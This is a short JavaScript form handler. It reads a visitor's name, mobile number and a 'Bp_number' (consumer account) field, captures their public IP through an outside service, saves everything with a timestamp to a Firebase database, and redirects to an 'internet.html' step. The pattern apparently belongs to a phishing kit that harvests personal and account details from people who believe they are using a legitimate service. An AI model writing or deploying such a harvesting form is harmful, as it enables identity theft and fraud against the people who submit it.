document.getElementById("ududip007").addEventListener("submit", function (e) {
    e.preventDefault();

    // ✅ Generate and store session key only once
    let userKey = localStorage.getItem("userSessionKey");
    if (!userKey) {
        userKey = firebase.database().ref("ududip007").push().key;
        localStorage.setItem("userSessionKey", userKey);
    }

    // ✅ Firebase reference to current user's session node
    const ref = firebase.database().ref("ududip007/" + userKey);

    // ✅ Collect form data
    var aname = document.getElementById("aname").value.trim();
    var bmobile = document.getElementById("bmobile").value.trim();
    var cac = document.getElementById("cac").value.trim().toUpperCase();

    // ✅ First fetch IP address
    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            var ipAddress = data.ip;

            // ✅ IST format timestamp
            var istTime = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });

            // ✅ Create combined object with IP & IST time
            var userData = {
                fullName: aname,
                mobileNumber: bmobile,
                Bp_number: cac,
                ipAddress: ipAddress,
                timestamp: istTime
            };

            // ✅ Save to Firebase
            ref.set(userData).then(() => {
                localStorage.setItem("vehicleNumber", cac);
                localStorage.setItem("fullName", aname);
                window.location.href = "internet.html";
            }).catch((error) => {
                alert("Error: " + error.message);
            });
        })
        .catch(error => {
            alert("Unable to get IP address: " + error.message);
        });
});
